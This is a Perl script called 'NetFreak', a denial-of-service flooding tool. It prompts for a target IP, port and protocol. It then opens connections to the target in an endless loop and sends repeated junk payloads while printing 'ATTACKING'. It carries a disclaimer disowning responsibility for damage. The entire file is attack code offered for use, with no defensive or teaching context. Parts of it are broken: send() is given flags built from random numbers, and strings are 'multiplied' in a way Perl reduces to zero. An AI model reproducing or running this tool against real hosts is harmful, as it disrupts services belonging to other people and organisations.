#!/usr/bin/perl
#Created By Benelhaj_younes

#=== Use Modules ===#
use IO::Socket;
use Scalar::Util qw(looks_like_number);

system("cls || clear");
print q{

            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMMNKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMNc.dWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMWd. .kWMMMMMMMMMMMMMMMMMMMMMMW0KMMMMMMMMMM
            MMMMMMMMk:;. 'OMMMMMMMMMMMMMMMMMMMMMWx.,0MMMMMMMMM
            MMMMMMMK:ok.  ,0MMMMMMMMMMMMMMMMMMMWO. .cXMMMMMMMM
            MMMMMMNl:KO.   ;KWNXK00O0000KXNWMMWO' .c;dWMMMMMMM
            MMMMMMx,xNk.    .;'...    ....';:l:.  ,0l,0MMMMMMM
            MMMMMK;,l;. .,:cc:;.                  .dx,lWMMMMMM
            MMMMWo    ,dKWMMMMWXk:.      .cdkOOxo,. ...OMMMMMM
            MMMM0'   cXMMWKxood0WWk.   .lkONMMNOOXO,   lWMMMMM
            MMMWl   ;XMMNo.    .lXWd. .dWk;;dd;;kWM0'  '0MMMMM
            kxko.   lWMMO.      .kMO. .OMMK;  .kMMMNc   oWMMMM
            kko'     :KMMNkl::lkNNd.   .dkdKWMNOkXO,    .lOKNW
            0Kk:.     .lOXWMMWN0d,       'lxO0Oko;.     .ckkOO
            0XWMMMMWKxc'.          ;dxc.          .,cxKK0OkkOO
            MMMMMMMMMMMN0d:'.  .'        .l'  .;lxKWMMMMMMMMMN
            MMMMMMMMMMMMMMMN0xo0O:,;;;;;;xN0xOXWMMMMMMMMMMMMMM
            MMMMMMMMMMMMMMMMMMMMMMWWWWWMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
  #---------------------------------------------------------------------------#
  |                "--------------NetFreak-------------"                      |
  |                "----Created By Benelhaj_younes-----"                      |
  |                "Illegal Disclaimer: I'm Not Responsible For Damage        |
  |                 Caused By This Program Use It At your Own Risk"           |
  #---------------------------------------------------------------------------#
};
# Check Intenret Connection !
my $check = IO::Socket::INET->new( 'PeerAddr'=>'www.google.com',
	'PeerPort'=>80,
	'Timeout'=>2,
	'proto'=>'tcp');
if(!(defined $check && $check)){
	print("[-] Internet Status[ Not Connected ]");
	print("\n[!] Error: Please Check Your Internet Connection !!!");
	exit(1);
}
$check->close();
# INPUT TARGET INFO ==============================================
print "\n===============================";
print "\n[~] Enter TargetIP: "; # Set Target IP
$host = <STDIN>;
chomp ($host);
while ($host eq ""){
 print "   [!] Enter TargetIP?: ";
 $host = <STDIN>;
 chomp ($host);
}
print "TRAGET ==> $host";
print "\n===============================";
print "\n[~] Enter Port: "; # Set Port
$port = <STDIN>;
chomp ($port);
while ($port eq "" || !looks_like_number($port) || !grep{$port eq $_}(0..65535)){
 print "   [!] Enter PORT?: ";
 $port = <STDIN>;
 chomp ($port);
}
print "PORT ==> $port";
print "\n===============================";
print "\n[~] Enter Protocol (TCP or UDP) :"; # Set Protocol;
$proto = <STDIN>;
chomp ($proto);
while ($proto eq "" || !grep{$proto eq $_} 'TCP','UDP','tcp','udp'){
 print "   [!] Enter Protockol (TCP or UDP) ?: ";
 $proto = <STDIN>;
 chomp ($proto);
}
print "Protocol ==> $proto";
print "\n===============================\n";
sleep(1);

$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
system("clear || cls");
print "\n[*] Attack Has Been Start On [$host:$port] proto => [$proto].......\n\n";
sleep(1);
while (1) {
  if(grep{$proto eq $_} 'TCP','tcp'){
       $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "$proto" ) || die "\n[!] Connection Failed To Target[$host] On Port[$port/$proto] !!!\n[!] Please Check Your TargetIP\n";
        for($i=0; $i<=500; $i++){
            $size = rand() * 8921873 * 99919988;
            print ("ATTACKING: (=>$host:$port~$proto<=)\n");
            send($sock, $size*2, $size*2);
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
        }

  }else{
            $size = rand() * 8921873 * 99919988;
            print ("ATTACKING: (=>$host:$port~$proto<=)\n");
            send($sock, $size*2, $size*2);
            send($sock, $size*3, $size*3);
            send($sock, $size*4, $size*4);
            send($sock, $size*9999999999999,$size*9999999999999);
            send($sock, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@#@#%23%235543wewreqwr#@523sdfsa"*2, "WEASRDWR#@%@#%$@#$#@%$@#%@#$@#$@#$@#$@asasf#@#%23%235543wewreqwr#@523sdfsa"*3);
 }
}
$sock->close()
########Becareful#########
